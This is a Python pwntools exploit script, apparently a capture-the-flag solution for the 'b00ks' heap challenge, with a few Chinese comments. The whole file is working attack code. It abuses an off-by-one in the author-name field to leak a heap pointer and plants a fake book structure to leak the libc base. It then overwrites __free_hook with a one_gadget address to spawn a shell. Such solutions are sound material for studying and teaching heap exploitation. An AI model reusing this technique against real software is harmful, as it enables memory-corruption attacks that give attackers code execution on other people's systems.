#! /usr/bin/env python3
from pwn import *

context(os='linux', arch='amd64', log_level='debug')
context.terminal = ['tmux','splitw','-h']
elf = ELF('./b00ks1')
libc = ELF('libc.so.6')
p = process('./b00ks1')

def create(name_size, name, des_size, des):
    p.recvuntil('> ')
    p.sendline('1')
    p.recvuntil('name size: ')
    p.sendline(str(name_size))
    p.recvuntil('name (Max 32 chars): ')
    p.sendline(name)
    p.recvuntil('description size: ')
    p.sendline(str(des_size))
    p.recvuntil('book description: ')
    p.sendline(des)

def delete(id):
    p.recvuntil('> ')
    p.sendline('2')
    p.recvuntil('delete: ')
    p.sendline(str(id))

def edit(id, des):
    p.recvuntil('> ')
    p.sendline('3')
    p.recvuntil('edit: ')
    p.sendline(str(id))
    p.recvuntil('description: ')
    p.sendline(des)

def show(index):
    p.recvuntil('> ')
    p.sendline('4')

def change_name(author_name):
    p.recvuntil('> ')
    p.sendline('5')
    p.recvuntil('name: ')
    p.sendline(author_name)

def debug():
    gdb.attach(p)
    pause()

p.recvuntil('name: ')
p.sendline('a'*32)

create(0xd0,'name1',0xe0,'des1')# 1 慢慢调试


# 提前 leak_heap
show(1)
p.recvuntil('a'*32)
book1_struct_addr = u64(p.recv(6).ljust(8, b'\x00'))
log.success('book_struct_addr: ' + hex(book1_struct_addr))

create(0x21000,'name2',0x21000,'des2')# 2 0x21000 0x21000


# change_name('1'*32)
book2_des_ptr = book1_struct_addr+0x30+0x10
log.success('book2_des_ptr: ' + hex(book2_des_ptr))

payload = flat(
    1,book2_des_ptr,
    book2_des_ptr,0x3000
)
edit(1,payload)

change_name('a'*32)

# leak_libc
show(1)

p.recvuntil('Name: ')
book2_name_addr = u64(p.recvuntil(b'\n',drop = 'True')[-6:].ljust(8, b'\x00'))
log.success('book2_name_addr: ' + hex(book2_name_addr))

libc.address = book2_name_addr-0x5a8010
log.success('libc.address: ' + hex(libc.address))

one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]
one_addr = libc.address + one_gadget[1]
log.success('one_addr: ' + hex(one_addr))

__free_hook_addr = libc.address + 0x3c67a8
log.success('__free_hook_addr: ' + hex(__free_hook_addr))

# 任意读写
edit(1,p64(__free_hook_addr))
edit(2,p64(one_addr))

delete(1)

p.interactive()
